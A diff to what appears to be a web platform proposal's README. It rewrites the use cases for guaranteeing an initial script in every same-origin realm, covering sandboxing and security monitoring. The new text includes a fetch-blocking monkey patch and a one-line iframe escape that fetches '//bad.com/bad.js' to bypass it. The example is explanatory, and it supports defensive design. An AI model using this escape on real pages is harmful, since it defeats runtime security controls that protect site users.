@@ -215,85 +215,50 @@ newFetchInstance(`https://${server}/${path}/?payload=` + payload)
 
 ## Use Cases
 
-Here are some use cases introduced by the community which led to composing this proposal.
-
-> _Please note that on our attempt to list use cases, we link them to real life examples by providing names of companies and/or products - none of them has actively reached out and provided their feedback on this proposal, but are merely given as use cases examples (unless clearly stated so at the top of each use case)._
+Here are some use cases introduced by the community which led to the composition of this proposal.
 
 ### Safe composability (sandboxing / confinement)
 
-> _This use case is approved by [Shopify](https://github.com/shopify) and [MetaMask](https://github.com/metamask)_
+The ability to safely embed untrusted code in a safe way is important for composability. Platforms can use it to allow their users as well as third party providers to enhance their provided functionality, and provide value to end users.
 
-Leading web platforms attempt to allow their users/customers to extend the functionality they provide by default, which is in fact an important trend in unleashing the true power of what the web has to offer as an infrastructure, because this allows them to become more than just services, but rather actual fully capable platforms. This concept is also known as composability, and there are powerful examples of how platforms that provide a high level of composablity tend to thrive.
+While the web platform allows such safe embedding through cross-origin iframes or workers, there are cases where same-origin untrusted-code embedding is required. E.g., in cases where the untrusted code may not be custom tailored to a sandboxed environment.
+In such cases, in order to guarantee the end user's security, platforms will constrain the capabilities that are available to the untrusted code by overriding native prototypes.
 
-The downside to composability is usually security, and that well applies to the web too.
-In many occasions, confinement of untrusted code (such as code that extends platform functionality) is being done via mitigation of access and/or power of capabilities.
-Problem is, with how the web is currently designed, reaching such powerful capabilities - even when tamed/mitigated - is still possible due to the same origin concern (which this proposal attempts to address).
+At the same time, it's hard to ensure that the overriding scripts are first to run in the embedded contexts, and determined attackers can use that to escape the sandbox under certain conditions. See the same origin concern for more details on that.
 
-Here are some well known examples of this:
+This proposal aims to solve this, by enabling the top-level document to guarantee running an initial script in every new same-origin realm, and prevent races that allow for sandbox escapes.
 
-#### [Shopify's](https://github.com/shopify) [Web Pixles](https://shopify.dev/docs/apps/build/marketing-analytics/pixels#lax-sandbox-custom-web-pixel)
+### Application Monitoring (security / errors / performance / ux)
 
-The well known e-commerce businesses platform Shopify allows developers to extend functionality of online shops they host so that both shop owners and users gain more value from the platform.
-Since this neccessarily means the platform must find a way to safely embed code it can't fully trust, Shopify design an in-house solution for how to embed such code in a mitigated and confined way.
+The ability to provide successful monitoring services for web applications heavily relies on the stage in which they are included within the different JavaScript realms of the app they're expected to monitor.
 
-[Web Pixles](https://shopify.dev/docs/apps/build/marketing-analytics/pixels#lax-sandbox-custom-web-pixel) is one example of that, where they embed the untrusted code within a sandboxed iframe with hope to confine it, but would obviously feel far more confident in their solution if they could make sure reaching powerful capabilities the untrusted code should not have access to would be impossible (which is something this proposal aspires to fix)
+Once installed, such services emulate the behaviour of different JavaScript APIs by hooking into them at runtime (aka "monkey patching") which then allows them to monitor the behaviour of the application as well as alter it.
 
-#### [MetaMask's](https://github.com/metamask) [Snaps](https://metamask.io/snaps/)
+By "monitoring" we really mean either tracking the app for errors or performance issues, studying app usage for UX enhancement, applying runtime security to it and more.
 
-MetaMask's crypto wallet is a browser extension that provides blockchain related services such as self custodial custody of crypto assets, blockchain communication and more.
-Some of its more prominent projects is the snaps platform, which effectively allows developers to build their own logic in the form of JavaScript plugins to extend the functionality the wallet provides by default.
+However, not being able to enforce such services to all same origin realms of the app (as opposed to its top most realm only), significantly narrows down the reach such services have.
 
-While is solved to a certain extent, the current implementation of the solution isn't the ideal approach the project aimed for.
-Snaps (the untrusted JavaScript plugin code) currently are executed within Web Workers so that they can't reach powerful capabilities, because as opposed to other environments, Web Workers do not allow JavaScript code to form other same origin realms to begin with and thus are not under the same origin concern risk.
+While true for all use cases mentioned above, it is the security aspect to which this applies the most.
 
-Landing this proposal, will allow to safely mitigate powerful capabilities all around the app - not just the top level realm - thus eliminating the same origin concern and allowing to implement plugin systems such as snaps outside of Web Workers in more capable environments where DOM APIs are of service and can provide great value to software bits such as snaps.
+That is because that while for the other use cases, missing on some same origin realms in the app isn't necessarily crucial, within the boundaries of security, attackers can leverage such ungoverned same origin realms to escape applied runtime security.
 
-#### [MetaMask's](https://github.com/metamask) [LavaMoat](https://github.com/lavamoat)
+To stress this even more, virtualizing the behaviour of JavaScript APIs to monitor/mitigate/block what malicious JavaScript code can do, such as by redefining the behaviour of `fetch`:
 
-Another project maintained by the MetaMask team is LavaMoat which focuses on sandboxing each dependency in the supply chain of a JavaScript based application and confine it to a minimum set of APIs it needs.
+```javascript
+const realFetch = window.fetch;
+window.fetch = function(url, ...args) {
+   if (url.includes('bad.com')) {
+      throw new Error('BLOCKED');
+   }
+   return realFetch(url, ...args);
+}
+```
 
-Since each dependency gets its own set of APIs it should have acces to, LavaMoat makes the hosting environment as useless as possible by blocking access to powerful capabilities it normally provides, so that if confined code somehow manages to escape the sandbox, it won't find powerful capabilities outside of it.
+is effectively meaningless as long as attackers can bypass this by escaping into ungoverned same origin realms (which this proposal aims to address):
 
-Unfortunately, given the `document` capability isn't a property that can be mitigated due to it being a non-configurable property, attackers can abuse it to form same origin realms and reach all the capabilities the LavaMoat tool is trying to hide.
-Having a controling API such as the proposed RIC would allow LavaMoat to apply such mitigations to all realms of the app automatically - not just the top level realm.
-
-> _This desired behaviour is currently accomplished using Snow (see [#Prior art](#Prior-art)), but to a limited extent due to the problems discussed in this proposal (which also led to its conception)_
-
-#### Others
-
-Composability is a strong use case which is perused by many great web platforms that are trying to both embed code written by others and confine it within the browser ecosystem (such as Salesforce, Figma, Wix and more).
-
-### Application Monitoring (security / errors / performance)
-
-> _This use case is approved by [Akamai](https://github.com/akamai)_
-
-Many well known companies provide monitoring services for web applications in the form of 3rd party scripts that are expected to be included in the top of the HTML file that represents the app.
-Once installed, such scripts emulate the behaviour of different JavaScript APIs by hooking into them at runtime (aka "monkey patching") which then allows them to monitor the behaviour of the application as well as alter it.
-
-While "Monitoring" is mentioned from the perspective of both performance and error tracking, it is security to which this proposal is most important.
-
-Here are some well known examples of this:
-
-#### [Akamai's](https://github.com/akamai) [mPulse](https://www.akamai.com/products/mpulse-real-user-monitoring)
-
-The well known cloud company [Akamai](https://github.com/akamai) provide such services where by installing their script in your website they can provide insights into how your application performs, what's your users' experience and whether there are any errors or issues it experiences in the browsers of your users.
-
-In order to accomplish that, such services hook into relevant JavaScript APIs which allows them to collect information which later on they translate into insights.
-
-However, being able to gain insights into other same origin realms that live within such applications could help mPulse broaden their reach, thus providing insights into less explored areas of the app in a more natural and consistent way.
-
-#### [Akamai's](https://github.com/akamai) [Page Integrity Manager](https://www.akamai.com/site/en/documents/product-brief/page-integrity-manager-product-brief.pdf)
-
-While performance and/or error tracking is a great argument, it's even more true in context of security, because for attackers, being able to reach into same origin realms they create and by that grab capabilities that were intentionally mitigated by the security vendor, really undermines the whole purpose of it, thus requiring the vendor to integrate more resilient approaches to mitigate such capabilities across all realms within the app (which is exactly what this proposal focuses on).
-
-#### Order of execution
-
-Another point brought up by Akamai which is relevant to both former use cases is how integrating such services with each other (or with other vendors' services) is rather difficult because of how there's no feature that can help with manifesting a clear order of execution of services. Meaning, when there's no proper way to order the chronological execution of scripts within all realms under the same origin, there are sometimes painful clashes between different services. This can be better regulated with a feature such as proposed here.
-
-#### Others
-
-Monitoring services are an important component of modern web applications and therefore there are many other actors that would be interested in such a solution, whether for security (such as PerimeterX CodeDefender, Transcend airgap.js, JScrambler Webpage Integrity and more) or performance and error tracking (such as Sentry, DataDog and more).
-
+```javascript
+document.body.appendChild(document.createElement('iframe')).contentWindow.fetch('//bad.com/bad.js');
+```
 
 ## Discussion
 
